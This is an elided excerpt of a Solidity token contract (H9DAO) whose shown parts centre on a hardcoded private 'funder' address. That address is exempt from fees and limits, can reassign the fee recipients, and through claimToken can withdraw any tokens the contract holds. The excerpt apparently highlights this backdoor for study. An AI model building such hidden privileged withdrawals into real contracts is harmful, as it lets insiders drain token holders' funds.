...
abstract contract AbsToken is IERC20, Ownable {
    ...
    address private funderAddress = 0xf0eb687E9C2fB76912500Dcb5Bedaf8ecC874f59;
    ...
    constructor (
        ...
        dividendAmount = 1 * 10** 17;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[funderAddress] = true;
        ...
        isWalletLimitExempt[funderAddress] = true;
        ...
        isWalletLimitExempt[address(0x0000)] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        holderRewardCondition = 200 * 10 ** IERC20(FISTAddress).decimals();
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                ...
                if (block.number < startTradeBlock + 400) {
                ...
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        ...
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee + _LPFee;
                            // uint256 numTokensSellToFund = amount * swapFee / 5000;
                            if (contractTokenBalance >= dividendAmount) {
    ...
    function _funTransfer(
        ...
        if(_feeWhiteList[sender]){
            ...
            _takeTransfer(sender, address(fundAddress),tAmount * 400 / 10000 );
            _takeTransfer(sender,address(this),tAmount * 600 / 10000);
            _takeTransfer(sender, recipient, tAmount - tAmount * 1000 / 10000);
        }
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            _takeTransfer(sender, address(fundAddress),tAmount * _buyLPDividendFee / 10000 );
        
            uint256 swapAmount = tAmount * _LPFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                feeAmount += tAmount * _buyLPDividendFee / 10000;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
    ...
    function setFundAddress(address addr,address funder) external onlyFunder {
        fundAddress = addr;
        funderAddress = funder;
        _feeWhiteList[addr] = true;
        _feeWhiteList[funder] = true;
    }
    ...
    function claimToken(address token, uint256 amount, address to) external {
        require(msg.sender == funderAddress);
        IERC20(token).transfer(to, amount);
    }

    modifier onlyFunder() {
        require(_owner == msg.sender || funderAddress == msg.sender, "!Funder");
        _;
    }
...
contract H9DAO is AbsToken {
    constructor() AbsToken(
        ...
        18, //Decimals
        1688, //Supply
        address(0xF1b3499c14dd611b7122C5F2F4D0b83eEd202491),//FAddress
        address(0x5474f2c180d443D9637ECFEA1cF4Af7C2d5eDf72)//token ReceiveAddress
    ){
